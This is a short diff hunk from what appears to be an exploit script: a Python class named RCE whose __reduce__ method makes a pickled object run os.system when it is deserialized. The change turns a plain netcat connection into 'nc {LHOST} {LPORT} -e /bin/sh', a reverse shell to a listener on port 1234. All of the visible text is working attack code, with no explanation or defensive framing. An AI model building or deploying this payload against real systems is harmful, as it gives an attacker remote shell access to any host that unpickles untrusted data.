@@ -7,7 +7,7 @@ LPORT = "1234"
 
 class RCE:
     def __reduce__(self):
-        cmd = (f'nc {LHOST} {LPORT}')
+        cmd = (f'nc {LHOST} {LPORT} -e /bin/sh')
         return os.system, (cmd,)
 
 if __name__ == '__main__':
